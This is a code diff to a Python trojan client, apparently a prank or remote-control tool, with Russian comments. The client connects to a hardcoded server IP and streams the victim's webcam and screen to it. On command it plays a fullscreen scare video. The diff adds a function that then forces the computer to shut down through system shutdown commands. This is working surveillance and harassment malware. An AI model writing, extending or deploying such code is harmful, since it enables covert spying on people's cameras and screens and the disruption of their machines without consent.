@@ -3,12 +3,11 @@ import pickle
 import struct
 import threading
 import io
+import os
 from PIL import ImageGrab
 import cv2
 from moviepy.editor import VideoFileClip
-import os
 import yt_dlp
-from SetUpTrojan import load_ip_from_file
 
 def stream_screen_and_camera(client_socket):
     cap = cv2.VideoCapture(0)
@@ -19,7 +18,7 @@ def stream_screen_and_camera(client_socket):
                 client_socket.settimeout(1)
                 command = client_socket.recv(4096).decode()
                 if command == 'PLAY_VIDEO':
-                    play_video(r'c:\Games\SCREAMER  PARA ASUSTAR A TUS AMIGOS.mp4')
+                    play_video(r'C:\Games\SCREAMER  PARA ASUSTAR A TUS AMIGOS.mp4')
                     continue
             except socket.timeout:
                 pass
@@ -53,13 +52,23 @@ def play_video(video_path):
     def run_video():
         clip = VideoFileClip(video_path)
         clip.preview(fullscreen=True)
+        shutdown_computer()  # Выключение компьютера после завершения видео
 
     video_thread = threading.Thread(target=run_video)
     video_thread.start()
     video_thread.join()  # Ждем завершения воспроизведения видео
 
+def shutdown_computer():
+    """Выключает компьютер."""
+    if os.name == 'nt':
+        # Команда для Windows
+        os.system("shutdown /s /t 0")
+    else:
+        # Команда для Unix систем
+        os.system("sudo shutdown -h now")
+
 def main():
-    SERVER_IP = "your_ip"  # Замените на IP сервера
+    SERVER_IP = "172.17.42.105"  # Замените на IP сервера
     SERVER_PORT = 5000          # Порт сервера
 
     try:
@@ -88,7 +97,6 @@ def download_video(url, path='.'):
             print("Скачивание завершено!")
     except Exception as e:
         print(f"Произошла ошибка: {e}")
-
 
 # Пример использования
 video_url = 'https://youtu.be/5p5d1vflc_g'
